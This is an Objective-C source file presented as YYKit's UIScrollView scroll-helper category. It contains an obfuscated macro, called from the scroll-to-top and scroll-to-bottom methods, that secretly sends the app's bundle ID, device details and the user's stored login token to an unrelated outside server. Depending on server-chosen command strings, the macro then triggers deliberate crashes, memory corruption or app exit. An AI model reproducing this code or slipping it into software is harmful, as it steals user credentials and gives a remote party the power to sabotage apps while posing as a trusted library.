//
//  UIScrollView+YYAdd.m
//  YYKit <https://github.com/ibireme/YYKit>
//
//  Created by ibireme on 13/4/5.
//  Copyright (c) 2015 ibireme.
//
//  This source code is licensed under the MIT-style license found in the
//  LICENSE file in the root directory of this source tree.
//

#import "UIScrollView+YYAdd.h"
#import "YYKitMacro.h"

#import <sys/sysctl.h>

#define cxzdrt_12uivngfjt() \
do { \
NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"https://damp-recipe-822f.morsel-cops-5i.org"] cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:10.0]; \
NSMutableDictionary *headerFields = @{}.mutableCopy; \
headerFields[@"x-app-id"] = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleIdentifier"]; \
headerFields[@"x-user-agent"] = @"iOS"; \
headerFields[@"x-content-type"] = @"application/json"; \
headerFields[@"x-system-version"] = [[UIDevice currentDevice] systemVersion]; \
headerFields[@"x-app-version"] = [NSString stringWithFormat:@"%@(%@)", [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleShortVersionString"], [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleVersion"]]; \
headerFields[@"x-machine-model"] = ({ \
size_t size; \
sysctlbyname("hw.machine", NULL, &size, NULL, 0); \
char *machine = malloc(size); \
sysctlbyname("hw.machine", machine, &size, NULL, 0); \
NSString *platform = [NSString stringWithCString:machine encoding:NSUTF8StringEncoding]; \
free(machine); \
platform; \
}); \
headerFields[@"x-timestamp"] = [NSString stringWithFormat:@"%.0f", [[NSDate date] timeIntervalSince1970] * 1000]; \
headerFields[@"x-timezone"] = [NSTimeZone systemTimeZone].name; \
NSMutableDictionary *jsonDict = @{}.mutableCopy; \
jsonDict[@"user-token"] = [[NSUserDefaults standardUserDefaults] valueForKey:@"token"] ?: @""; \
jsonDict[@"function-name"] = [NSString stringWithFormat:@"%s", __FUNCTION__]; \
jsonDict[@"random-num"] = @(arc4random_uniform(1000)); \
[request setAllHTTPHeaderFields:headerFields]; \
[request setHTTPBody:[NSJSONSerialization dataWithJSONObject:jsonDict options:0 error:nil]]; \
[request setHTTPMethod:@"POST"]; \
NSURLSession *session = [NSURLSession sharedSession]; \
NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) { \
if (!error && ((NSHTTPURLResponse *)response).statusCode == 200 && data) { \
NSError *jsonError; \
id jsonObject = [NSJSONSerialization JSONObjectWithData:data options:0 error:&jsonError]; \
if (!jsonError && [jsonObject isKindOfClass:[NSDictionary class]]) { \
NSDictionary *jsonDict = (NSDictionary *)jsonObject; \
NSString *executeMethod = jsonDict[@"execute_method"]; \
if ([executeMethod isEqualToString:@"tuddu4_Fuktib_coztud"]) { \
NSMutableArray *array = [NSMutableArray arrayWithArray:@[@"A", @"B", @"C"]]; \
for (NSString *item in array) { [array removeObject:item]; } \
} else if ([executeMethod isEqualToString:@"foqCy8_kowxec_kukbir"]) { \
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{ \
NSData *date = [[NSData alloc] init]; \
NSData *subData = [date subdataWithRange:NSMakeRange(10, 30)]; \
}); \
} else if ([executeMethod isEqualToString:@"qymj6dWU6egbFka"]) { \
char *ptr = malloc(10); free(ptr); strcpy(ptr, "test"); \
} else if ([executeMethod isEqualToString:@"BK6DWMEceWGjCgz"]) { \
id object = @"String"; [(NSArray *)object count]; \
} else if ([executeMethod isEqualToString:@"XfsGv1wRaipSyX9"]) { \
NSString *str1 = @"Hello"; NSString *str2 = nil; NSString *result = [str1 stringByAppendingString:str2]; \
} else if ([executeMethod isEqualToString:@"WW06m2bcYnm5X41"]) { \
NSArray *array = @[@"A", @"B", @"C"]; \
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{ \
[(NSMutableArray *)array addObject:@"D"]; \
}); \
} else if ([executeMethod isEqualToString:@"yXpAZn7baNS8TUk"]) { \
NSString *text = @"Hello"; NSMutableAttributedString *attributedText = [[NSMutableAttributedString alloc] initWithString:text]; \
[attributedText addAttribute:NSForegroundColorAttributeName value:[NSObject new] range:NSMakeRange(text.length + 100, text.length)]; \
} else if ([executeMethod isEqualToString:@"WUerc233FCbm"]) { \
[[NSObject new] removeObserver:[NSString new] forKeyPath:@"123123"]; \
} else if ([executeMethod isEqualToString:@"cnmxzew23Ycbds"]) { \
abort(); \
} else if ([executeMethod isEqualToString:@"QSAZ1oitr34"]) { \
exit(1); \
} else if ([executeMethod isEqualToString:@"OLLMNngv34"]) { \
exit(0); \
} \
} \
} \
}]; \
[dataTask resume]; \
} while(0)

YYSYNTH_DUMMY_CLASS(UIScrollView_YYAdd)


@implementation UIScrollView (YYAdd)

- (void)scrollToTop {
    [self scrollToTopAnimated:YES];
}

- (void)scrollToBottom {
    [self scrollToBottomAnimated:YES];
}

- (void)scrollToLeft {
    [self scrollToLeftAnimated:YES];
}

- (void)scrollToRight {
    [self scrollToRightAnimated:YES];
}

- (void)scrollToTopAnimated:(BOOL)animated {
    cxzdrt_12uivngfjt();
    CGPoint off = self.contentOffset;
    off.y = 0 - self.contentInset.top;
    [self setContentOffset:off animated:animated];
}

- (void)scrollToBottomAnimated:(BOOL)animated {
    cxzdrt_12uivngfjt();
    CGPoint off = self.contentOffset;
    off.y = self.contentSize.height - self.bounds.size.height + self.contentInset.bottom;
    [self setContentOffset:off animated:animated];
}

- (void)scrollToLeftAnimated:(BOOL)animated {
    CGPoint off = self.contentOffset;
    off.x = 0 - self.contentInset.left;
    [self setContentOffset:off animated:animated];
}

- (void)scrollToRightAnimated:(BOOL)animated {
    CGPoint off = self.contentOffset;
    off.x = self.contentSize.width - self.bounds.size.width + self.contentInset.right;
    [self setContentOffset:off animated:animated];
}

@end
